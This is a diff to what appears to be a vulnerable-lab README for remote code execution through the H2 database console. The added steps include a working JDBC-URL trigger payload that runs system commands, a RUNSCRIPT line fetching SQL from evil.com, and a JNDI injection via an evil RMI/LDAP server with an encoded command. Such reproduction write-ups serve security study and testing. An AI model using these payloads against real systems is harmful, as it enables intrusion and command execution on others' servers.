@@ -9,11 +9,15 @@ spring.h2.console.enabled=true
 spring.h2.console.settings.web-allow-others=true
 ```
 
-This management page supports using JNDI to load the JDBC driver, which can lead to remote code execution via remote class loading.
+This management page supports to use JNDI to load the JDBC driver, which can lead to remote code execution via JDBC attacking or JNDI injection.
 
 References:
 
 - <https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e>
+- <https://www.exploit-db.com/exploits/45506>
+- <https://github.com/h2database/h2database/pull/1580>
+- <https://github.com/h2database/h2database/pull/1726>
+- <https://github.com/h2database/h2database/issues/1225>
 
 ## Setup
 
@@ -27,7 +31,39 @@ After started the container, the spring-boot is listening on `http://your-ip:808
 
 ## Vulnerability Reproduce
 
-Reference to *[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)*, we should use `org.apache.naming.factory.BeanFactory` and `javax.el.ELProcessor` to launch the external process after Java 8u191:
+There are two ways to exploit this vulnerability, one is the [JDBC attack](https://su18.org/post/jdbc-connection-url-attack/), the other is the [JNDI injection](https://www.veracode.com/blog/research/exploiting-jndi-injections-java).
+
+### JDBC Attack
+
+The H2 console allows users to specify any JDBC URL. By specifying `jdbc:h2:mem:testdb` and using the JDBC `init` property, we can execute any SQL statements in the local memory server's memory.
+
+The h2 database supports some special and dangerous commands, such as:
+
+- `RUNSCRIPT FROM 'http://evil.com/script.sql'`
+- `CREATE ALIAS func AS code ...; CALL func ...`
+- `CREATE TRIGGER ... AS code ...`
+
+We can use `CREATE TRIGGER` to construct a malicious SQL statement, then put it into the JDBC URL:
+
+```
+jdbc:h2:mem:testdb;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
+    var is = java.lang.Runtime.getRuntime().exec("id").getInputStream()
+    var scanner = new java.util.Scanner(is).useDelimiter("\\A")
+    throw new java.lang.Exception(scanner.next())
+$$;
+```
+
+Click "Test Connection" in the H2 console and capture the request, then modify the JDBC URL in the request to successfully execute the `id` command.
+
+![](1.png)
+
+### JNDI Injection
+
+The H2 console after version 1.4.197 added a new [`-ifNotExists` option](https://github.com/h2database/h2database/pull/1726) that disable remote database creation by default. This new change makes it harder to exploit JDBC attacks in the absence of a known database.
+
+However, the H2 console still supports JNDI injection, which can be used to execute arbitrary commands.
+
+Reference to [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), we can use `org.apache.naming.factory.BeanFactory` and `javax.el.ELProcessor` to launch the external process after Java 8u191:
 
 ```java
 import java.rmi.registry.*;
@@ -53,20 +89,18 @@ public class EvilRMIServerNew {
 }
 ```
 
-Simply use this tool *[JNDI](https://github.com/JosephTribbianni/JNDI)* to exploit the vulnerability. First, set up the target command to `touch /tmp/success` at `config.properties`:
+Simply use this tool [JNDIExploit](https://github.com/vulhub/JNDIExploit) to exploit the vulnerability.
 
-![](3.png)
-
-Then start the `JNDI-1.0-all.jar`, is will be listening on `0.0.0.0:23456`. fill in the form based on these pieces of information:
-
-![](1.png)
-
-`javax.naming.InitialContext` is the JNDI factory class name, URL `rmi://evil:23456/BypassByEL` is your evil RMI address.
-
-Evil RMI server received the requests:
+Start the `JNDIExploit` and fill in the form based on these pieces of information:
 
 ![](2.png)
 
-`touch /tmp/success` has been execute successfully:
+`javax.naming.InitialContext` is the JNDI factory class name, URL `ldap://172.17.0.1:1389/TomcatBypass/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz` is your evil JNDI url.
+
+Evil JNDI server received the requests:
+
+![](3.png)
+
+As you can see, `touch /tmp/success` has been executed successfully:
 
 ![](4.png)
